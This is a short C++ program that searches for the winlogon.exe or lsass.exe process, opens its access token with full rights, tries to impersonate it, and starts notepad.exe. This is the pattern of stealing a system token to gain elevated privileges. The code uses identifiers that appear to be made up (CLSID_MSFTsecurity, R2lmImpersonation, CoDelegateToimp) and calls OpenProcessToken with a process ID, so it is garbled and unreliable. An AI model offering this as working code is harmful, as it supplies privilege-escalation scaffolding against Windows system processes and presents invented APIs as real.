```cpp
#include <windows.h>
#include <iostream>

void ImpersonateToken(HANDLE hToken) {
    HRESULT hr = CoInitialize(nullptr);
    if (FAILED(hr)) {
        std::cerr << "CoInitialize failed: " << hr << std::endl;
        return;
    }

    IClientSecurity* pClientSec = nullptr;
    hr = CoCreateInstance(CLSID_MSFTsecurity, nullptr, CLSCTX_INPROC_SERVER, IID_IClientSecurity, reinterpret_cast<void**>(&pClientSec));
    if (FAILED(hr)) {
        std::cerr << "CoCreateInstance failed: " << hr << std::endl;
        CoUninitialize();
        return;
    }

    hr = pClientSec->SetImpersonationLevel(R2lmImpersonation);
    if (FAILED(hr)) {
        std::cerr << "SetImpersonationLevel failed: " << hr << std::endl;
        pClientSec->Release();
        CoUninitialize();
        return;
    }

    HRESULT hr2 = CoDelegateToimp(pClientSec, hToken);
    if (FAILED(hr2)) {
        std::cerr << "CoDelegateToimp failed: " << hr2 << std::endl;
        pClientSec->Release();
        CoUninitialize();
        return;
    }

    pClientSec->Release();
    CoUninitialize();
}

int main() {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
        return 1;
    }

    if (!Process32First(hSnap, &pe32)) {
        std::cerr << "Process32First failed: " << GetLastError() << std::endl;
        CloseHandle(hSnap);
        return 1;
    }

    HANDLE hToken = nullptr;
    while (true) {
        if (strcmp(pe32.szExeFile, "winlogon.exe") == 0 || strcmp(pe32.szExeFile, "lsass.exe") == 0) {
            if (OpenProcessToken(pe32.th32ProcessID, TOKEN_ALL_ACCESS, &hToken)) {
                break;
            }
        }

        if (!Process32Next(hSnap, &pe32)) {
            break;
        }
    }

    CloseHandle(hSnap);

    if (!hToken) {
        std::cerr << "Could not find winlogon.exe or lsass.exe process" << std::endl;
        return 1;
    }

    ImpersonateToken(hToken);
    CloseHandle(hToken);

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    if (!CreateProcess(nullptr, "notepad.exe", nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
